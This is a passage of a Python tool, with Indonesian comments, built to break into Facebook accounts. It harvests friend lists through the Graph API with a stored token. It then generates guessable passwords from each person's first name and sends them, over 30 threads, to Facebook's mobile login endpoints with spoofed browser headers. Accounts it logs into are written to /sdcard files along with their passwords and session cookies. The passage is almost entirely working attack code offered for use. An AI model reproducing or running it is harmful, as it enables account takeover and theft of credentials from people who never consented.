	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
	    exit()
	try:
		#print(f'{xxx}─────────────────────────────')
		kumpulkan = int(input(f'└── Mau Berapa Id? : '))
	except ValueError:
	    exit()
	if kumpulkan<1 or kumpulkan>1000:
	    exit()
	ses=requests.Session()
	bilangan = 0
	for KOTG49H in range(kumpulkan):
		bilangan+=1
		Masukan = input(f'└── Masukkan Id Yang Ke  '+str(bilangan)+f' : ')
		uid.append(Masukan)
	for user in uid:
	    try:
	       head = (
	       {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
	       })
	       if len(id) == 0:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	          
	       )
	       else:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	           
	       )
	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
	       for xr in url['friends']['data']:
	           try:
	               woy = (xr['id']+'|'+xr['name'])
	               if woy in id:pass
	               else:id.append(woy)
	           except:continue
	    except (KeyError,IOError):
	      pass
	    except requests.exceptions.ConnectionError:
	        exit()
	try:
	      print(f"└── sukses mengumpulkan {H}{(len(id))} {x}user")
	      setting()
	except requests.exceptions.ConnectionError:
	    exit()
	except (KeyError,IOError):
		exit()
#<----------[ DEF-METHOD ]---------->#
def At_metod():
	print(f'❫════════════════════ ≪ °❈° ≫ ════════════════════❪')
	print(f' {M}[{H}1{M}]{P}. VALID			{M}[{H}2{M}]{P}. ASYNC ')
	print(f'❫════════════════════ ≪ °❈° ≫ ════════════════════❪')
	ganteng_ = input(f' {M}[{K}${M}]{P}. PILIH COK 1/2 : ')
	if ganteng_ in ['01','1']:
		kentod.append('valid')
	elif ganteng_ in ['02','2']:
		kentod.append('async')
	else:
		at(f" {B}══➤{P} MASUKAN HANYA ANGKA COK")
		waktu(2)
		At_metod()
	print(f'❫════════════════════ ≪ °❈° ≫ ════════════════════❪')
	passs = input(f' {M}[{K}${M}]{P}. TAMBAHKAN PW MANUAL Y/t : ')
	if passs in ['y','Y']:
		pwkon.append('ya')
		paskon = input(f' {M}[{K}${M}]{P}. MASUKAN PW MANUAL :  ')
		paslon = paskon.split(',')
		for _pw_ in paslon:
			pwnya.append(_pw_)
	else:
		pwkon.append('tidak')
		Te_pass()
#<----------[ DEF-WONDERLIST ]---------->#
def Te_pass():
	global prog,des,AteGanteng,GantengPoll
	print(f'❫════════════════════ ≪ °❈° ≫ ════════════════════❪')
	print(f""" {M}[{K}${M}]{P}. HASIL LIVE DI = {H}{oke}{P}\n {M}[{K}${M}]{P}. HASIL CHEK DI = {K}{cpe}{P}\n {M}[{K}${M}]{P}. MODE FLY SETIAP 300 ID DEN SUKA KAMU """)
	print(f'❫════════════════════ ≪ °❈° ≫ ════════════════════❪')
	AteGanteng = Progress(TextColumn('{task.description}'),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
	GantengPoll = AteGanteng.add_task('',total=len(id))
	with AteGanteng:
		with tred(max_workers=30) as plongo:
			for mustika in id1:
				uid,nama = mustika.split('|')[0],mustika.split('|')[1].lower()
				depan = nama.split(' ')[0]
				pasat = []
				if len(nama)<6:
					if len(depan)<3:
						pass
					else:
						pasat.append(nama)
						pasat.append(depan+'123')
						pasat.append(depan+'1234')
						pasat.append(depan+'12345')
						pasat.append(depan+'123456')
						pasat.append(depan+'03')
						pasat.append(depan+'26')
						pasat.append(depan+'55')
						pasat.append(depan+'29')
				else:
					if len(depan)<3:
						pasat.append(nama)
					else:
						pasat.append(nama)
						pasat.append(depan+'123')
						pasat.append(depan+'1234')
						pasat.append(depan+'12345')
						pasat.append(depan+'123456')
						pasat.append(depan+'03')
						pasat.append(depan+'26')
						pasat.append(depan+'55')
						pasat.append(depan+'29')
				if 'at' in pwkon:
					for pwde in pwnya:
						pasat.append(pwde)
				else:pass
				if 'valid' in kentod:
					plongo.submit(validate,uid,pasat)
				elif 'async' in kentod:
					plongo.submit(asyncc,uid,pasat)
				else:
					plongo.submit(validate,uid,pasat)
		print(f'❫════════════════════ ≪ °❈° ≫ ════════════════════❪')
		print(f" {M}[{K}${M}]{P}. SUKSES CRACK {B}{len(id1)}{P} ID,DENGAN JUMPLAH HASIL\n {M}[{K}${M}]{P}. AT-LIVE = {H}{ok} \n {M}[{K}${M}]{P}. AT-CHEK = {K}{cp}{P}")
		print(f'❫════════════════════ ≪ °❈° ≫ ════════════════════❪')

#<----------[ DEF-VALIDATE ]---------->#
def validate(uid,pasat):
	global loop,ok,cp
	AteGanteng.update(GantengPoll,description=f' [TEGAR] [{(loop)}/{len(id)}] [LIVE = [green]{(ok)}[white]] [CHEK = [yellow]{(cp)}[white]]')
	AteGanteng.advance(GantengPoll)
	ua = AteUgen()
	ses = requests.Session()
	for pw in pasat:
		try:
			p = ses.get('https://m.prod.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fapp_id%3D285562428300787%26cbt%3D1709452496918%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfe2e12d59af8fed29%2526domain%253Dwww.jamtangan.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.jamtangan.com%25252Ff8a7fd5c976607552%2526relation%253Dopener%26client_id%3D285562428300787%26display%3Dtouch%26domain%3Dwww.jamtangan.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.jamtangan.com%252Flogin%26locale%3Den_US%26logger_id%3Df48b37a2e1119e20c%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dff857ee30a26b211a%2526domain%253Dwww.jamtangan.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.jamtangan.com%25252Ff8a7fd5c976607552%2526relation%253Dopener%2526frame%253Dfb4ebd097bc939579%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv5.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dff857ee30a26b211a%26domain%3Dwww.jamtangan.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.jamtangan.com%252Ff8a7fd5c976607552%26relation%3Dopener%26frame%3Dfb4ebd097bc939579%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa = ({
			"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
			"uid":uid,
			"next": "https://m.prod.facebook.com/v5.0/dialog/oauth?app_id=285562428300787&cbt=1709452496918&channel_url=https://staticxx.facebook.com-x-connect&xd_arbiter/version=4623&cb=fe2e12d59af8fed29&domain=www.jamtangan.com&is_canvas/false&origin=https://www.jamtangan.com-f8a7fd5c976607552&relation/opener&client_id=285562428300787&display/touch&domain=www.jamtangan.com-e2e-fallback_redirect_uri=https://www.jamtangan.com&login/locale&en_US/logger_id=f48b37a2e1119e20c&origin=2&redirect_uri=https://staticxx.facebook.com-x-connect&xd_arbiter/version=4623&cb=ff857ee30a26b211a&domain=www.jamtangan.com&is_canvas/false&origin=https://www.jamtangan.com-f8a7fd5c976607552&relation/opener&frame=fb4ebd097bc939579&response_type/token&signed_request/graph_domain&return_scopes/true&scope/email&public_profile/sdk/joey&version=v5.0&ret/login&fbapp_pres=0&tp/unspecified",
			"flow":"login_no_pin",
			"pass":pw,
			})
			koki_kon = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			heade=({
			'Host': 'm.prod.facebook.com',
			'content-length': f"{len(str(dataa))}",
			'cache-control': 'max-age=0',
			'dpr': f'{str(rr(1,10))}',
			'viewport-width': f'{str(rr(99,999))}',
			'sec-ch-ua': f'"Not_A Brand";v="{str(rr(1,99))}", "Chromium";v="{str(rr(10,120))}"',
			'sec-ch-ua-mobile': f'?{str(rr(0,1))}',
			'sec-ch-ua-platform': '"Android"',
			'sec-ch-ua-platform-version': f'"{str(rr(1,25))}.0.0"',
			'sec-ch-ua-full-version-list': f'"Not_A Brand";v="{str(rr(1,99))}.0.0.0", "Chromium";v="{str(rr(10,120))}.0.{str(rr(1000,10000))}.{str(rr(10,270))}"',
			'sec-ch-prefers-color-scheme': 'dark',
			'upgrade-insecure-requests': '1',
			'origin': 'https://m.prod.facebook.com',
			'content-type': 'application/x-www-form-urlencoded',
			'x-requested-with': 'XMLHttpRequest',
			'user-agent': ua,
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
			'sec-fetch-site': 'same-origin',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-user': '?1',
			'sec-fetch-dest': 'document',
			'referer': 'https://m.prod.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fapp_id%3D285562428300787%26cbt%3D1709452496918%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfe2e12d59af8fed29%2526domain%253Dwww.jamtangan.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.jamtangan.com%25252Ff8a7fd5c976607552%2526relation%253Dopener%26client_id%3D285562428300787%26display%3Dtouch%26domain%3Dwww.jamtangan.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.jamtangan.com%252Flogin%26locale%3Den_US%26logger_id%3Df48b37a2e1119e20c%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dff857ee30a26b211a%2526domain%253Dwww.jamtangan.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.jamtangan.com%25252Ff8a7fd5c976607552%2526relation%253Dopener%2526frame%253Dfb4ebd097bc939579%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv5.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dff857ee30a26b211a%26domain%3Dwww.jamtangan.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.jamtangan.com%252Ff8a7fd5c976607552%26relation%3Dopener%26frame%3Dfb4ebd097bc939579%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
			'accept-encoding': 'gzip, deflate, br',
			'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
			})
			po = ses.post("https://m.prod.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID", data=dataa,headers=heade,cookies={'cookie': koki_kon},allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r ══➤ {K}{uid}|{pw}    {P}')
				open('/sdcard/AT-CHEK/'+cpe,'a').write(uid+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r ══➤ {H}{uid}|{pw}    {P}')
				print(f' ══➤{U}{kuki} {P}')
				open('/sdcard/AT-LIVE/'+oke,'a').write(uid+'|'+pw+'|'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
#<----------[ DEF-ASYNC ]---------->#
def asyncc(uid,pasat):
	global loop,ok,cp
	AteGanteng.update(GantengPoll,description=f' [TEGAR] [{(loop)}/{len(id)}] [LIVE = [green]{(ok)}[white]] [CHEK = [yellow]{(cp)}[white]]')
	AteGanteng.advance(GantengPoll)
	ua = AteUgen()
	ses = requests.Session()
	for pw in pasat:
		try:
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=285562428300787&kid_directed_site=0&app_id=285562428300787&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fapp_id%3D285562428300787%26cbt%3D1709452496918%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfe2e12d59af8fed29%2526domain%253Dwww.jamtangan.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.jamtangan.com%25252Ff8a7fd5c976607552%2526relation%253Dopener%26client_id%3D285562428300787%26display%3Dtouch%26domain%3Dwww.jamtangan.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.jamtangan.com%252Flogin%26locale%3Den_US%26logger_id%3Df48b37a2e1119e20c%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dff857ee30a26b211a%2526domain%253Dwww.jamtangan.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.jamtangan.com%25252Ff8a7fd5c976607552%2526relation%253Dopener%2526frame%253Dfb4ebd097bc939579%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv5.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dff857ee30a26b211a%26domain%3Dwww.jamtangan.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.jamtangan.com%252Ff8a7fd5c976607552%26relation%3Dopener%26frame%3Dfb4ebd097bc939579%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={
			'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1),
			'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1),
			'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1),
			'try_number': '0',
			'unrecognized_tries': '0',
			'email': uid,
			'pass': pw,
			'prefill_contact_point': '',
			'prefill_source': '',
			'prefill_type': '',
			'first_prefill_source': '',
			'first_prefill_type': '',
			'had_cp_prefilled': 'false',
			'had_password_prefilled': 'false',
			'is_smart_lock': 'false',
			'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)
			}
			koki_kon = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			heade={
			"Host": "m.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://m.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": 'https://m.facebook.com/login.php?skip_api_login=1&api_key=285562428300787&kid_directed_site=0&app_id=285562428300787&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fapp_id%3D285562428300787%26cbt%3D1709452496918%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfe2e12d59af8fed29%2526domain%253Dwww.jamtangan.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.jamtangan.com%25252Ff8a7fd5c976607552%2526relation%253Dopener%26client_id%3D285562428300787%26display%3Dtouch%26domain%3Dwww.jamtangan.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.jamtangan.com%252Flogin%26locale%3Den_US%26logger_id%3Df48b37a2e1119e20c%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dff857ee30a26b211a%2526domain%253Dwww.jamtangan.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.jamtangan.com%25252Ff8a7fd5c976607552%2526relation%253Dopener%2526frame%253Dfb4ebd097bc939579%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv5.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dff857ee30a26b211a%26domain%3Dwww.jamtangan.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.jamtangan.com%252Ff8a7fd5c976607552%26relation%3Dopener%26frame%3Dfb4ebd097bc939579%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
			"accept-encoding": "gzip, deflate br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,headers=heade,cookies={'cookie': koki_kon},allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r ══➤ {K}{uid}|{pw}    {P}')
				open('/sdcard/AT-CHEK/'+cpe,'a').write(uid+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r ══➤ {H}{uid}|{pw}    {P}')
				print(f' ══➤{U}{kuki} {P}')
				open('/sdcard/AT-LIVE/'+oke,'a').write(uid+'|'+pw+'|'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1

#<----------[__MAIN__]------------->#
if __name__=='__main__':
	try:os.mkdir('/sdcard/AT-LIVE')
	except:pass
	try:os.mkdir('/sdcard/AT-CHEK')
	except:pass
# INGET JANGAN DIPERJUAL BELIKAN BLOK
# JANGAN BERHARAP YG TIDAK PASTI
# OPREK AJA BIAR FULL IJO
# MAKASIH AUGTHOR KANG OPREK:)
# AT_GANTENG YA KAN :)